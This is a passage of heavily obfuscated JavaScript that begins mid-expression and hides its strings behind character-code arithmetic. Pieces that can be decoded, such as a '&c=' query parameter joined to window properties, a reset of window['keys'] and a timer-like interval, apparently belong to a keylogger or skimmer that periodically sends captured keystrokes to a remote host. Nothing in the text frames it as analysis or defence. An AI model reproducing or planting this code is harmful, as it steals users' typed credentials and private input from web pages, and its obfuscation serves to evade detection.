})())]*('JP'.length*'QFCd'.length+'kLh'.length)+'iPV'.length)+(0x2*5+0)),('gk'.length*('uCB'.length*020+2)+(3*03+1)),('n'.length*(String.fromCharCode(0153)[((function () { var GE="th",v1="g",Mb="le",$9="n"; return Mb+$9+v1+GE })())]*(String.fromCharCode(110)[(String.fromCharCode(0154,0x65,110,0x67,0x74,104))]*('J'.length*(0x3*('V'.length*(01*('U'.length*9+1)+3)+0)+3)+8)+(('w'.length*(0x1*0x6+5)+1)*0x1+0))+(02*024+0))+(1*(('nW'.length*0x5+1)*1+0)+2)),(String.fromCharCode(0107,72)[(String.fromCharCode(0154,0x65,110,0147,0164,0150))]*(1*('I'.length*016+0)+2)+('BQ'.length*6+2)),(String.fromCharCode(82)[((function () { var Rh="th",s2="g",B="len"; return B+s2+Rh })())]*(2*047+0)+('o'.length*(1*('Z'.length*('d'.length*'WRTOMtJwl'.length+2)+3)+8)+5)),(((06*0x4+3)*'H'.length+0)*String.fromCharCode(0x74,100,0x41,84)[(String.fromCharCode(108,0x65,0156,0x67,116,0150))]+'ew'.length),('isqL'.length*(01*'IBYTUU'.length+4)+'SULOhYs'.length),('l'.length*(12*'Ry'.length+0)+(01*18+4)),('zeS'.length*(01*(02*15+4)+1)+'lhcFazkSz'.length),('S'.length*((1*061+10)*1+0)+('AF'.length*023+4)),('jGcCDoe'.length*('Zf'.length*5+4)+'x'.length),('I'.length*('sN'.length*((function () { var Wj='i',Xs='x'; return Xs+Wj })()[((function () { var BZ="gth",hN="len"; return hN+BZ })())]*(function () { var Wf='H',zl='A',tK='jbHyW',re='FJ'; return tK+re+zl+Wf })()[((function () { var F_="gth",E2="en",BT="l"; return BT+E2+F_ })())]+'zlvm'.length)+(0x1*06+4))+(0x5*('VTJ'.length*'DYK'.length+1)+1)),((function () { var em='p'; return em })()[((function () { var Z9="th",mn="ng",Hc="l",j8="e"; return Hc+j8+mn+Z9 })())]*(String.fromCharCode(0x7a,0x66,0x53)[((function () { var $VY="h",N="t",KC="leng"; return KC+N+$VY })())]*(String.fromCharCode(0155,77)[((function () { var UP="h",b="t",bI="le",mi="ng"; return bI+mi+b+UP })())]*('i'.length*('cf'.length*05+1)+3)+'RYqm'.length)+'eA'.length)+(('H'.length*('ox'.length*05+2)+2)*1+0)),('OSe'.length*(('XriooKt'.length*'Gh'.length+1)*String.fromCharCode(105,113)[(String.fromCharCode(0154,101,0x6e,0147,0x74,0150))]+('NTMiOy'.length-6))+('t'.length*8+3)),(String.fromCharCode(79)[(String.fromCharCode(0154,101,0x6e,0147,0x74,104))]*('G'.length*23+7)+(02*7+3)),('P'.length*('ZK'.length*('Mk'.length*0xb+3)+7)+(0x2*25+4)),('M'.length*(0x2*(0x2*('W'.length*('c'.length*'UYibyHyV'.length+5)+0)+3)+23)+('b'.length*('rys'.length*'TxkLrl'.length+2)+16)),(String.fromCharCode(0x69,70,0112,0x6b,109,103,116)[(String.fromCharCode(108,0145,0156,0x67,0164,0150))]*('JZ'.length*'WDIVdbG'.length+1)+('Qg'.length*'xsyD'.length+3)),('biIDymRQ'.length*('sgNf'.length*'xNZ'.length+'AW'.length)+('hRPgAY'.length-6)),('p'.length*('FSNq'.length*((function () { var qz7='H'; return qz7 })()[((function () { var EQ="th",zC="g",uK="le",G7="n"; return uK+G7+zC+EQ })())]*('f'.length*('p'.length*(0x1*'FgirQaAj'.length+3)+1)+'qO'.length)+('Z'.length*(02*0x5+0)+2))+'YmMH'.length)+'EcJiFDzlc'.length),('D'.length*('B'.length*0101+5)+('Zj'.length*('x'.length*0x12+1)+8)),(String.fromCharCode(113)[(String.fromCharCode(0x6c,0x65,0x6e,103,116,104))]*(5*'qsSutmUi'.length+4)+'rc'.length),('H'.length*(01*075+20)+(1*0x15+10)),('q'.length*(('FkP'.length*String.fromCharCode(0x4b,0155,78,0163,0116,0114)[((function () { var iH="h",bF="ng",$1="l",xo="t",Up="e"; return $1+Up+bF+xo+iH })())]+'e'.length)*'dfC'.length+'X'.length)+('Se'.length*0x15+4)),((function () { var K='N'; return K })()[(String.fromCharCode(0x6c,0x65,110,0147,0164,0x68))]*(('f'.length*8+5)*'zIhiJw'.length+2)+('e'.length*22+10)),(String.fromCharCode(0x43,109)[(String.fromCharCode(0x6c,101,0x6e,103,0164,0x68))]*(String.fromCharCode(78)[(String.fromCharCode(108,0x65,110,0147,116,104))]*('q'.length*('HlTmx'.length*03+0)+0)+(('T'.length*07+6)*'R'.length+0))+'UyklEei'.length),('i'.length*('k'.length*68+22)+'vtGDKlG'.length),('n'.length*(String.fromCharCode(0x77)[(String.fromCharCode(0154,101,0156,0x67,0x74,0x68))]*('zRz'.length*10+2)+(0x1*(02*('k'.length*'YlKyLFJPI'.length+3)+4)+1))+('nJQndPnCw'.length-9)))+window[String[((function(){var Ok=(function () { var $D="de",dq="rCo"; return dq+$D })(),SR=(function () { var fv="ha",$G="mC",Gf="fro"; return Gf+$G+fv })();return SR+Ok;})())](('Cs'.length*('IZtQEDCm'.length*String.fromCharCode(0104,103,0x42,0163,0102,0x48)[((function () { var x="ngth",po="le"; return po+x })())]+'ZK'.length)+('H'.length*0xa+2)),((function () { var cCQ='l',UL='i'; return UL+cCQ })()[((function () { var z="th",W7="leng"; return W7+z })())]*(3*(0x2*0x7+0)+3)+'keibLqR'.length),((function () { var Od='f'; return Od })()[((function () { var _y="h",uH="engt",rQ="l"; return rQ+uH+_y })())]*(87*'E'.length+0)+(01*('T'.length*016+1)+1)),(String.fromCharCode(0154)[(String.fromCharCode(0x6c,0x65,0x6e,103,0x74,104))]*(0x1*0x31+26)+(0x2*('q'.length*'CXPUhpYZ'.length+2)+6)))]+(function(){var ue=(function(){var L6=(function () { var qI='='; return qI })();return L6;})(),YV=String[((function () { var Pf="rCode",WN="fromCha"; return WN+Pf })())](('I'.length*075+38)),NQ=String[(String.fromCharCode(102,0x72,111,0155,0x43,104,97,0x72,0103,0x6f,100,0x65))](('r'.length*0x1e+8));return NQ+YV+ue;})()+window[(function(){var cY=String[((function () { var cK="de",D4="C",J="f",VS="harCo",X$="rom"; return J+X$+D4+VS+cK })())]((1*('B'.length*(0127*0x1+0)+2)+12)),Ey=(function(){var Bo=String.fromCharCode(116);return Bo;})(),oP=String[((function () { var mH="de",Jy="rCo",tG="fromCha"; return tG+Jy+mH })())](('o'.length*('Lw'.length*0x1a+8)+40),(('qfAy'.length*8+0)*3+1));return oP+Ey+cY;})()]+String[(String[((function () { var F9="Code",ps="romChar",sH="f"; return sH+ps+F9 })())](('D'.length*0144+2),('Wvd'.length*('C'.length*('KdPH'.length*0x7+2)+7)+3),('nU'.length*056+19),('RX'.length*('Vgu'.length*(01*'pxNjHDHJ'.length+5)+1)+29),(1*0x35+14),('oEmlRqVqU'.length*013+5),(2*('QA'.length*(02*0x7+3)+8)+13),(1*(1*('SHm'.length*0xd+11)+45)+19),(0x2*(1*('pgNLZTny'.length*'NjFN'.length+0)+0)+3),(1*0x60+15),('T'.length*071+43),(0x1*(012*7+1)+30)))](('qwG'.length*(0x1*07+4)+'HaLeY'.length),(String.fromCharCode(86)[(String.fromCharCode(108,0x65,0156,0147,116,0x68))]*(((function () { var eS='i',eb='j'; return eb+eS })()[(String.fromCharCode(0154,101,0x6e,103,116,0x68))]*(function () { var dd='pr',YM='n',kI='Hb',Jr='i'; return kI+Jr+YM+dd })()[((function () { var D="gth",s0="en",fu="l"; return fu+s0+D })())]+'A'.length)*'linXTz'.length+'G'.length)+(0x7*'MBX'.length+0)),(String.fromCharCode(75)[((function () { var O3="gth",IH="n",Pr="le"; return Pr+IH+O3 })())]*(0x1*045+21)+'Yfc'.length))+window[String[(String[(String.fromCharCode(0x66,0x72,0x6f,0x6d,0103,0150,97,0162,67,0157,100,0x65))](('KGT'.length*30+12),(2*('MJK'.length*('bJ'.length*0x5+0)+9)+36),('xhw'.length*(0x1*('Wdn'.length*'ngQTbGwVn'.length+1)+2)+21),(06*(01*013+5)+13),('AqGpF'.length*13+2),(2*('R'.length*('X'.length*(2*(07*'BW'.length+1)+2)+12)+7)+2),('j'.length*('Mr'.length*18+14)+47),(1*(1*0104+22)+24),('ykGRW'.length*12+7),('ob'.length*0x2d+21),('cmTy'.length*0x19+0),(1*74+27)))](('fFnEY'.length*('g'.length*('FeTGx'.length*'Al'.length+0)+8)+(01*(6*'Tb'.length+0)+5)),((function () { var wm='H'; return wm })()[((function () { var Hv="th",mx="g",MN="le",ka="n"; return MN+ka+mx+Hv })())]*('b'.length*(String.fromCharCode(0x72)[((function () { var _5="th",yB="g",bO="le",vW="n"; return bO+vW+yB+_5 })())]*(String.fromCharCode(120,101)[((function () { var BF="gth",cH="len"; return cH+BF })())]*(1*('BKvAFa'.length*2+0)+9)+(010*'Ds'.length+1))+'UCBUQ'.length)+(023*1+0))+('GPZsba'.length*'cjj'.length+0)),('B'.length*(2*032+23)+('AwLNdUF'.length*'OmSLfu'.length+4)),((function () { var vR='n',FI='v'; return FI+vR })()[(String.fromCharCode(0154,0145,0x6e,103,0164,104))]*('C'.length*(0xc*'orY'.length+1)+7)+(2*013+5)))]+'';window[(function(){var Bp=String[((function () { var UF="Code",Oa="mChar",$H="fro"; return $H+Oa+UF })())](('x'.length*0x58+27)),zU=(function(){var as=String.fromCharCode(121),gD=(function () { var vM="e"; return vM })(),zb=String.fromCharCode(107);return zb+gD+as;})();return zU+Bp;})()]='';},(String.fromCharCode(0x43)[(String.fromCharCode(0x6c,0145,110,0x67,0x74,0x68))]*(String.fromCharCode(0x58,0x53,88,0146,0x47)[((function () { var K="h",N3="engt",t="l"; return t+N3+K })())]*(0x1*01620+387)+(03*'GJHne'.length+0))+('m'.length*('t'.length*((function () { var y='D'; return y })()[(String.fromCharCode(108,101,0x6e,103,0x74,104))]*(0x3*('acO'.length*'ecvPQh'.length+1)+3)+'QHi'.length)+('q'.length*0x2b+12))+(03*10+8))));
